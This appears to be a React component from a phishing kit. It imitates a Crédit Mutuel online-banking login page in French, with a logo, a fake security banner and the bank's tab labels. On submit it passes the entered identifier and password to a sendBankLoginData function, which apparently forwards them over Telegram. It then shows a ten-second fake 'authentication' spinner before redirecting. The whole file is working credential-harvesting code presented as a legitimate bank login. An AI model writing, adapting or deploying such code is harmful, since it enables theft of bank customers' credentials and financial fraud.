import React, { useState } from 'react';
import { X, Search, Eye, EyeOff, Info } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderGAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderGAuth = ({ onAuthenticate, onBack, bankName }: ProviderGAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant && motDePasse) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#1D4ED8] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center">
            <img
              src="https://logos-marques.com/wp-content/uploads/2020/01/Cr%C3%A9dit-Mutuel-logo.png"
              alt="Logo"
              className="h-8 lg:h-10"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
          </div>

          <div className="flex items-center space-x-4">
            <div className="hidden lg:flex items-center space-x-6 text-sm">
              <button className="text-gray-600 hover:text-gray-800">Particuliers</button>
              <button className="text-gray-600 hover:text-gray-800">Professionnels</button>
              <button className="text-gray-600 hover:text-gray-800">Entreprises</button>
            </div>

            <div className="flex items-center space-x-4">
              <button className="p-2 text-gray-600 hover:text-gray-800">
                <Search size={20} />
              </button>
              <button className="bg-white border border-[#1D4ED8] text-[#1D4ED8] px-4 py-2 rounded-full text-sm hover:bg-blue-50 transition-colors">
                Ouvrir un compte
              </button>
              <button
                onClick={onBack}
                className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
              >
                <X size={20} />
              </button>
            </div>
          </div>
        </div>
      </header>

      <div className="bg-blue-50 border border-blue-200 p-4 mx-4 mt-4 rounded-lg">
        <div className="flex items-start space-x-3">
          <Info className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
          <div className="text-sm text-blue-800">
            <strong>Connexion sécurisée :</strong> Vérifiez toujours que vous êtes sur le bon site avant de saisir vos identifiants.
          </div>
        </div>
      </div>

      <div className="flex justify-center py-8 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-2xl lg:text-3xl font-semibold text-[#1D4ED8] mb-8 text-center">
            Se connecter
          </h1>

          <div className="flex border-b border-gray-200 mb-8">
            <button className="flex-1 py-3 px-4 text-[#1D4ED8] border-b-2 border-[#1D4ED8] font-medium text-sm">
              Identifiant / Mot de passe
            </button>
            <button className="flex-1 py-3 px-4 text-gray-600 hover:text-gray-800 text-sm">
              Certificat Électronique
            </button>
            <button className="flex-1 py-3 px-4 text-gray-600 hover:text-gray-800 text-sm">
              SAFETRANS
            </button>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="text-sm text-gray-600 mb-4">
              <span className="text-red-500">*</span> : information obligatoire
            </div>

            <div>
              <label className="block text-gray-700 font-medium mb-2">
                Identifiant <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                value={identifiant}
                onChange={(e) => setIdentifiant(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1D4ED8] focus:border-transparent"
              />
            </div>

            <div>
              <label className="block text-gray-700 font-medium mb-2">
                Mot de passe <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={motDePasse}
                  onChange={(e) => setMotDePasse(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1D4ED8] focus:border-transparent pr-12"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>

            <button
              type="submit"
              disabled={!identifiant || !motDePasse || isLoading}
              className="w-full bg-[#1D4ED8] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#1E40AF] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#1D4ED8] focus:ring-offset-2"
            >
              Se connecter
            </button>

            <div className="flex flex-col space-y-4 text-center">
              <button type="button" className="text-[#1D4ED8] hover:underline flex items-center justify-center">
                Codes d'accès oubliés <span className="ml-2">→</span>
              </button>
              <button type="button" className="text-[#1D4ED8] hover:underline flex items-center justify-center">
                Infos sécurité <span className="ml-2">→</span>
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default ProviderGAuth;
